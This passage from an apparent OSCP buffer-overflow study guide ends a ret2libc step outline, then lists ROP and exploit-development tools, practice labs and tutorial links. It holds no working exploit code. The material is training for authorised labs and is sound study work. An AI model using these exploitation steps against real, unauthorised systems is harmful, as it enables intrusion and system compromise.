2. If NX enabled → ret2libc
3. Find system() and /bin/sh addresses
4. Build ret2libc payload
```

---

## Tools for ROP/ret2libc

| Tool | Platform | Purpose |
|------|----------|---------|
| **mona.py** | Windows | ROP chain generation |
| **ROPgadget** | Linux | Find ROP gadgets |
| **ropper** | Linux | ROP gadget search |
| **pwntools** | Linux | Exploit development |
| **radare2** | Cross-platform | Reverse engineering |
| **GDB + peda** | Linux | Dynamic analysis |

---

## Practice Resources

### ROP Practice
- **ROP Emporium**: https://ropemporium.com/
  - Dedicated ROP challenges
  - 32-bit and 64-bit
  - Increasing difficulty

### ret2libc Practice
- **pwnable.kr**: ret2libc challenges
- **HackTheBox**: October (Linux BOF)
- **VulnHub**: Various Linux exploitation VMs

---

## Additional Resources

### Practice Environments
- **OSCP PWK Labs**: Multiple BOF machines
- **VulnHub**: Brainpan, GATEKEEPER
- **TryHackMe**: Buffer Overflow Prep room
- **HackTheBox**: October (retired)
- **ROP Emporium**: Dedicated ROP training

### Further Reading
- **Corelan Exploit Writing Tutorials**: https://www.corelan.be/
- **FuzzySecurity Windows Exploit Development**: http://fuzzysecurity.com/tutorials.html
- **Offensive Security AWE**: Advanced Windows Exploitation
- **ROP Primer**: https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html
- **ret2libc Guide**: https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc

---

**Remember**: Buffer overflows are methodical. Follow the steps precisely, document bad characters carefully, and always test locally first! For OSCP, focus on standard BOF techniques first, then expand to ROP/ret2libc if needed.
